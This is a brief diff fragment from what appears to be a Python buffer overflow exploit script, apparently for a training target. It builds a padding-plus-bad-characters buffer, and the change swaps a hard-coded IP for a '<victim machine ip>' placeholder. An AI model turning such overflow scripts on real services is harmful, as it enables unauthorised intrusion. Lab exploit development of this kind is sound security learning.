@@ -22,7 +22,7 @@ buf = "A" * 524 + 'B' * 4 + badchars
 
 try:
 
-	s.connect(('192.168.1.8', 9999))
+	s.connect(('<victim machine ip>', 9999))
 
 except:
 
